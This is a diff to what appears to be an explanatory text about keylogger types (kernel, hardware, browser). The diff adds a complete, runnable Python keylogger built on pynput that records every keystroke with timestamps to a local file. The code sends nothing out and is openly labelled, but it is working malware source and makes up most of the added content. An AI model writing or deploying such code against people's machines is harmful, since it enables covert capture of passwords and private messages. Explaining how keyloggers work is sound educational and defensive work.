@@ -10,3 +10,20 @@ Keyloggers operate at different levels depending on their type:
 - Kernel keyloggers: operate at kernel level, harder to detect, intercept keystrokes at the driver level
 - Hardware keyloggers: physical devices plugged between the keyboard and the computer, completely invisible to the OS and any software
 - Browser keyloggers: malicious browser extensions that capture input only inside the browser
+
+```python
+# simple software keylogger in Python using pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(str(key.char))
+    except AttributeError:
+        logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+```
